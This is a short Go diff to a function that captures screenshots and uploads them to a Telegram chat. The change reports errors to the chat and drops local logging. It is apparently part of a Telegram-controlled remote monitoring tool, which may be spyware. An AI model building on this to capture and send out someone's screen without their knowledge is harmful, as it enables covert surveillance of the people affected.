@@ -17,7 +17,7 @@ func takeScreenshots(chatID int64) {
 
 		img, err := screenshot.CaptureRect(bounds)
 		if err != nil {
-			// log.Printf("Error capturing screenshot: %v", err)
+			SendMessage(chatID, fmt.Sprintf("Error capturing screenshot: %v", err))
 			continue
 		}
 
@@ -25,19 +25,13 @@ func takeScreenshots(chatID int64) {
 		var buf bytes.Buffer
 		err = png.Encode(&buf, img)
 		if err != nil {
-			// log.Printf("Error encoding image: %v", err)
+			SendMessage(chatID, fmt.Sprintf("Error encoding image: %v", err))
 			continue
 		}
 
 		fileName := fmt.Sprintf("screenshot_%d_%dx%d.png", i, bounds.Dx(), bounds.Dy())
 
 		// Send the image to Telegram
-		err = sendDocument(chatID, fileName, buf.Bytes())
-		if err != nil {
-			// log.Printf("Error sending document: %v", err)
-			continue
-		}
-
-		// fmt.Printf("Sent screenshot #%d : %v \"%s\"\n", i, bounds, fileName)
+		_ = sendDocument(chatID, fileName, buf.Bytes())
 	}
 }
